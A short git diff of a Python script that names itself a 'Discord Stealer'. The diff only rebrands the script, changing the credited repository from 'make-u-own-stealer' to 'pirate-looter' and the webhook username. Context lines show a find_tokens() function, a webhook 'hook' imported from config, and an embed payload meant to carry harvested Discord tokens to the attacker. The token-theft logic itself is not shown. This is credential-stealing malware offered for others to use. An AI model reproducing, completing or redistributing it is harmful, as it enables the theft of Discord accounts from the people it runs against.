@@ -1,6 +1,5 @@
-# Github.com/Lawxsz/make-u-own-stealer #
-# leave a star # 
-# PD: u can improve this script with username, badges etc
+# github.com/real-fbdn/pirate-looter
+# leave a star!! 
 
 import os, re, requests, json
 from config import hook
@@ -48,7 +47,7 @@ def find_tokens():
 
     tokendata = {
     "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-    "username": "Prysmax Free",
+    "username": "pirate-looter",
     "embeds": [
         {
       "title": "Discord Stealer",
